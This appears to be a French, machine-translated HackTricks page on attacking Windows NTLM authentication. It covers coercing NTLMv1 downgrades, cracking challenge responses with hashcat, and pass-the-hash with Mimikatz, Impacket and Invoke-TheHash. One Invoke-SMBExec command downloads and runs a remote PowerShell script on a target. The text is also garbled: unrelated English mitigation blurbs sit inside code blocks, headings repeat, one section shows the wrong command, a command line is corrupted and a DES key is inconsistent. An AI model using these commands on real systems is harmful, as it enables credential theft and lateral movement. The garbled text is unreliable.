# NTLM

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

Dans les environnements où **Windows XP et Server 2003** sont en fonction, les hachages LM (Lan Manager) sont utilisés, bien qu'il soit largement reconnu qu'ils peuvent être facilement compromis. Un hachage LM particulier, `AAD3B435B51404EEAAD3B435B51404EE`, indique un scénario où LM n'est pas utilisé, représentant le hachage pour une chaîne vide.

Par défaut, le protocole d'authentification **Kerberos** est la méthode principale utilisée. NTLM (NT LAN Manager) intervient dans des circonstances spécifiques : absence d'Active Directory, inexistence du domaine, dysfonctionnement de Kerberos en raison d'une configuration incorrecte, ou lorsque des connexions sont tentées en utilisant une adresse IP plutôt qu'un nom d'hôte valide.

La présence de l'en-tête **"NTLMSSP"** dans les paquets réseau signale un processus d'authentification NTLM.

Le support des protocoles d'authentification - LM, NTLMv1 et NTLMv2 - est facilité par une DLL spécifique située à `%windir%\Windows\System32\msv1\_0.dll`.

**Points clés**:

* Les hachages LM sont vulnérables et un hachage LM vide (`AAD3B435B51404EEAAD3B435B51404EE`) signifie qu'il n'est pas utilisé.
* Kerberos est la méthode d'authentification par défaut, avec NTLM utilisé uniquement dans certaines conditions.
* Les paquets d'authentification NTLM sont identifiables par l'en-tête "NTLMSSP".
* Les protocoles LM, NTLMv1 et NTLMv2 sont pris en charge par le fichier système `msv1\_0.dll`.

## LM, NTLMv1 et NTLMv2

Vous pouvez vérifier et configurer quel protocole sera utilisé :

### GUI

Exécutez _secpol.msc_ -> Stratégies locales -> Options de sécurité -> Sécurité réseau : Niveau d'authentification LAN Manager. Il y a 6 niveaux (de 0 à 5).

![](<../../.gitbook/assets/image (919).png>)

### Registre

Cela définira le niveau 5 :
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
### Valeurs possibles:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Schéma d'authentification de base NTLM Domain

1. L'**utilisateur** introduit ses **informations d'identification**
2. La machine cliente **envoie une demande d'authentification** en envoyant le **nom de domaine** et le **nom d'utilisateur**
3. Le **serveur** envoie le **défi**
4. Le **client chiffre** le **défi** en utilisant le hachage du mot de passe comme clé et l'envoie en réponse
5. Le **serveur envoie** au **contrôleur de domaine** le **nom de domaine, le nom d'utilisateur, le défi et la réponse**. Si **aucun** annuaire Active Directory n'est configuré ou si le nom de domaine est le nom du serveur, les informations d'identification sont vérifiées **localement**.
6. Le **contrôleur de domaine vérifie si tout est correct** et envoie les informations au serveur

Le **serveur** et le **contrôleur de domaine** peuvent créer un **canal sécurisé** via le serveur **Netlogon** car le contrôleur de domaine connaît le mot de passe du serveur (il est à l'intérieur de la base de données **NTDS.DIT**).

### Schéma d'authentification NTLM local

L'authentification est similaire à celle mentionnée **précédemment mais** le **serveur** connaît le **hachage de l'utilisateur** qui tente de s'authentifier dans le fichier **SAM**. Ainsi, au lieu de demander au contrôleur de domaine, le **serveur vérifiera lui-même** si l'utilisateur peut s'authentifier.

### Défi NTLMv1

La **longueur du défi est de 8 octets** et la **réponse fait 24 octets** de long.

Le **hachage NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (7B + 7B + (2B+0x00\*5)): la **dernière partie est remplie de zéros**. Ensuite, le **défi** est **chiffré séparément** avec chaque partie et les octets chiffrés résultants sont **assemblés**. Total : 8B + 8B + 8B = 24 octets.

**Problèmes** :

* Manque de **randomisation**
* Les 3 parties peuvent être **attaquées séparément** pour trouver le hachage NT
* **DES est crackable**
* La 3ème clé est toujours composée de **5 zéros**
* Avec le **même défi**, la **réponse** sera la **même**. Ainsi, vous pouvez donner comme **défi** à la victime la chaîne "**1122334455667788**" et attaquer la réponse en utilisant des **tables arc-en-ciel précalculées**.

### Attaque NTLMv1

De nos jours, il est de moins en moins courant de trouver des environnements configurés avec une Délégation sans contrainte, mais cela ne signifie pas que vous ne pouvez pas **abuser d'un service de spouleur d'impression** configuré.

Vous pourriez abuser de certaines informations d'identification/sessions que vous avez déjà dans l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification sur 1122334455667788**, capturer la tentative d'authentification, et si elle a été effectuée en utilisant **NTLMv1**, vous pourrez la **craquer**.\
Si vous utilisez `responder`, vous pourriez essayer d'utiliser le drapeau `--lm` pour tenter de **réduire** l'**authentification**.\
_Notez que pour cette technique, l'authentification doit être effectuée en utilisant NTLMv1 (NTLMv2 n'est pas valide)._

Rappelez-vous que l'imprimante utilisera le compte d'ordinateur lors de l'authentification, et les comptes d'ordinateur utilisent des **mots de passe longs et aléatoires** que vous **ne pourrez probablement pas craquer** en utilisant des **dictionnaires courants**. Mais l'authentification **NTLMv1** utilise **DES** ([plus d'informations ici](./#ntlmv1-challenge)), donc en utilisant certains services spécialement dédiés au craquage de DES, vous pourrez la craquer (vous pourriez utiliser [https://crack.sh/](https://crack.sh) par exemple).

### Attaque NTLMv1 avec hashcat

NTLMv1 peut également être cassé avec l'outil NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) qui formate les messages NTLMv1 d'une manière qui peut être cassée avec hashcat.

La commande
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
```markdown
## NTLM Relay Attack

### Introduction

NTLM relay attacks are a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic between a client and a server, and then relaying it to another server to gain unauthorized access.

### Mitigation

To mitigate NTLM relay attacks, it is recommended to implement the following security measures:

1. **Enforce SMB Signing**: By enabling SMB signing, you can protect against tampering with NTLM authentication traffic.

2. **Enable LDAP Signing**: LDAP signing helps prevent man-in-the-middle attacks that can be used to relay NTLM authentication.

3. **Disable NTLMv1**: NTLMv1 is vulnerable to various attacks, including relay attacks. It is recommended to disable NTLMv1 and use NTLMv2 or Kerberos instead.

4. **Implement Extended Protection for Authentication**: This feature helps protect against NTLM relay attacks by requiring extended protection for authentication.

5. **Use Group Policy**: Configure Group Policy settings to enforce the above security measures across all Windows machines in the network.

By implementing these security measures, you can significantly reduce the risk of NTLM relay attacks in your Windows environment.
```
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Hashes

## Introduction

NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. NTLM hashes are commonly targeted by attackers for password cracking and lateral movement within a network.

## Extracting NTLM Hashes

To extract NTLM hashes from a Windows system, tools like Mimikatz can be used. Mimikatz is a powerful post-exploitation tool that can dump NTLM hashes from memory or from the Security Account Manager (SAM) database.

## Protecting Against NTLM Hash Attacks

To protect against NTLM hash attacks, it is recommended to implement the following security measures:

1. **Disable NTLM**: Disable the use of NTLM where possible and favor more secure authentication protocols like Kerberos.
2. **Enforce Complex Passwords**: Encourage users to use complex and unique passwords to make password cracking more difficult.
3. **Enable SMB Signing**: Enabling SMB signing can help prevent attackers from relaying NTLM authentication attempts.
4. **Monitor Event Logs**: Regularly monitor event logs for suspicious activities related to NTLM authentication.

By following these best practices, organizations can better protect their systems and data from NTLM hash attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Exécutez hashcat (la distribution est meilleure via un outil tel que hashtopolis) car cela prendra plusieurs jours sinon.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Dans ce cas, nous savons que le mot de passe est password, donc nous allons tricher à des fins de démonstration :
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Nous devons maintenant utiliser les utilitaires hashcat pour convertir les clés DES craquées en parties du hash NTLM :
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Enfin la dernière partie :
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
### NTLM

---

#### NTLM Relay Attack

---

#### NTLM Relay Attack

---

#### Attaque de relais NTLM

---
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Défi NTLMv2

La **longueur du défi est de 8 octets** et **2 réponses sont envoyées** : l'une fait **24 octets** de long et la longueur de **l'autre** est **variable**.

**La première réponse** est créée en chiffrant en utilisant **HMAC\_MD5** la **chaîne** composée par le **client et le domaine** et en utilisant comme **clé** le **hachage MD4** du **hachage NT**. Ensuite, le **résultat** sera utilisé comme **clé** pour chiffrer en utilisant **HMAC\_MD5** le **défi**. Pour cela, **un défi client de 8 octets sera ajouté**. Total : 24 B.

La **deuxième réponse** est créée en utilisant **plusieurs valeurs** (un nouveau défi client, un **horodatage** pour éviter les **attaques de rejeu**...)

Si vous avez un **pcap qui a capturé un processus d'authentification réussi**, vous pouvez suivre ce guide pour obtenir le domaine, le nom d'utilisateur, le défi et la réponse et essayer de craquer le mot de passe : [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Une fois que vous avez le hachage de la victime**, vous pouvez l'utiliser pour **l'impersonner**.\
Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hachage**, **ou** vous pourriez créer une nouvelle **sessionlogon** et **injecter** ce **hachage** à l'intérieur du **LSASS**, ainsi lorsque toute **authentification NTLM est effectuée**, ce **hachage sera utilisé.** La dernière option est ce que fait mimikatz.

**N'oubliez pas que vous pouvez également effectuer des attaques Pass-the-Hash en utilisant des comptes d'ordinateur.**

### **Mimikatz**

**Doit être exécuté en tant qu'administrateur**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz mais en interne dans LSASS, les informations d'identification enregistrées sont celles à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly` mais vous n'avez pas besoin de connaître le mot de passe en clair).

### Pass-the-Hash depuis linux

Vous pouvez obtenir l'exécution de code sur des machines Windows en utilisant Pass-the-Hash depuis Linux.\
[**Accédez ici pour apprendre comment le faire.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Outils compilés Windows Impacket

Vous pouvez télécharger [les binaires Impacket pour Windows ici](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Dans ce cas, vous devez spécifier une commande, cmd.exe et powershell.exe ne sont pas valides pour obtenir un shell interactif) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Il existe plusieurs autres binaires Impacket...

### Invoke-TheHash

Vous pouvez obtenir les scripts PowerShell d'ici : [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

#### Appeler-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Appeler-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Appeler-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l'**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l'une quelconque** des options **SMBExec** et **WMIExec** mais que vous ne fournissez aucun paramètre _**Commande**_, il se contentera de **vérifier** si vous avez **suffisamment de permissions**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Éditeur de crédentials Windows (WCE)

**Doit être exécuté en tant qu'administrateur**

Cet outil fera la même chose que mimikatz (modifier la mémoire LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Exécution à distance manuelle de Windows avec nom d'utilisateur et mot de passe

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extraction d'informations d'identification à partir d'un hôte Windows

**Pour plus d'informations sur** [**comment obtenir des informations d'identification à partir d'un hôte Windows, vous devriez lire cette page**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay et Responder

**Lisez un guide plus détaillé sur la façon d'effectuer ces attaques ici:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analyser les défis NTLM à partir d'une capture réseau

**Vous pouvez utiliser** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
